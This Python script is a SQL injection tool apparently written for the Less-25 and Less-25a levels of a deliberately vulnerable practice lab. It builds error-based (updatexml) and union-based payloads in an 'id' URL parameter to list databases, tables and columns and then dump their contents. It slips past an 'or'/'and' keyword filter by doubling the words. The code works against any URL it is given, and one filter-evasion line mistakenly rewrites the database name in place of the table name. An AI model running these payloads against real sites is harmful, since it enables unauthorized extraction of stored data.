import requests
from bs4 import BeautifulSoup


class Less25_Less25a(object):

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c,a):

        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

        self.dbs = dbs

        self.tables = tables

        self.columns = columns

        self.schema = schema

        self.d = d.replace('or','oorr')

        self.d = self.d.replace('and','anandd')

        self.t = t.replace('or','oorr')

        self.d = self.d.replace('and','anandd')

        self.c = c.replace('or','oorr')

        self.c = self.c.replace('and','anandd')

        self.a = a




    def soup(self,text):

        soup = BeautifulSoup(text,"html5lib")

        strings = soup.find_all('font')[2].text   # 筛选数据 25

        try:

            return strings.split("~")[-2]

        except IndexError as e:

            pass



    def soup_a(self,text):

        soup = BeautifulSoup(text,"html5lib")    # 筛选数据25a

        strings = soup.find_all('font')[2].text

        return strings.split("You")[1].split(":")[1].split(",")




    def dbs_payload(self):

        count = 0

        if self.level == 25 and not self.a:   # level 25 payload

            while True:

                rep = requests.get(self.url+"?id=1' || updatexml(1,concat(0x7e,(select concat(schema_name) from infoORrmation_schema.schemata limit "+str(count)+",1),0x7e),1) --+")

                if self.soup(rep.text) == None:

                    break

                else:

                    print(self.soup(rep.text))

                count += 1
                                # level 25a payload
        elif self.level == 25 and self.a:

            rep = requests.get(self.url+"?id=-1 union select 1,(select group_concat(schema_name) from infoorrmation_schema.schemata),3 #")

            print(self.soup_a(rep.text))



    def tables_payload(self):

        count = 0

        if self.level == 25 and not self.a:

            while True:                             # 25 payload

                rep = requests.get(self.url+"?id=1' || updatexml(1,concat(0x7e,(select table_name from infoORrmation_schema.tables where table_schema='"+self.d+"' limit "+str(count)+",1),0x7e),1) --+")

                if self.soup(rep.text) == None:

                    break

                else:

                    print(self.soup(rep.text))

                count += 1

        elif self.level == 25 and self.a:           # 25a payload

            rep = requests.get(self.url+"?id=-1 union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='"+self.d+"'),3 #")

            print(self.soup_a(rep.text))




    def columns_payload(self):

        count = 0

        if self.level == 25 and not self.a:

            while True:                    # 25 payload

                rep = requests.get(self.url+"?id=1' || updatexml(1,concat(0x7e,(select column_name from infoORrmation_schema.columns where table_schema='"+self.d+"' anandd table_name='"+self.t+"' limit "+str(count)+",1),0x7e),1) --+")

                if self.soup(rep.text) == None:

                    break

                else:

                    print(self.soup(rep.text))

                count += 1

        elif self.level == 25 and self.a:  # 25a payload

            rep = requests.get(self.url+"?id=-1 union select 1,(select group_concat(column_name) from infoORrmation_schema.columns where table_schema='"+self.d+"' anandd table_name='"+self.t+"'),3 #")

            print(self.soup_a(rep.text))



    def data_payload(self):

        count = 0

        if self.level == 25 and not self.a:

            while True:                 # 25 payload

                rep = requests.get(self.url+"?id=1' anandd updatexml(1,concat(0x7e,(select "+self.c+" from "+self.d+"."+self.t+" limit "+str(count)+",1),0x7e),1) --+")

                if self.soup(rep.text) == None:

                    break

                else:

                    print(self.soup(rep.text))

                count += 1

        elif self.level == 25 and self.a:      # 25a payload

            rep = requests.get(self.url+"?id=-1 union select 1,(select group_concat("+self.c+") from "+self.d+"."+self.t+"),3 #")

            print(self.soup_a(rep.text))



    def DBS(self):

        self.dbs_payload()


    def TABLES(self):           # 使用对应的payload

        self.tables_payload()


    def COLUMNS(self):

        self.columns_payload()


    def SCHEMA(self):

        self.data_payload()


    def TYPE(self):

        if self.dbs:  # 如果枚举数据库被设置

            self.DBS()

        elif self.d != '' and self.tables: # 如果枚举表和数据库名被设置

            self.TABLES()

        elif self.t != '' and self.columns and self.d != '': # 如果枚举列,和数据表,和数据列被设置

            self.COLUMNS()

        elif self.c != '' and self.t != '' and self.d != '' and self.schema: # 如果数据表,数据库,数据列被设置

            self.SCHEMA()

        else:
            print("wrong options and bad type!")



    def Less_25(self):
        self.TYPE()
        

                              # 调用对应的level 等级
    def Less_25a(self):
        self.TYPE()

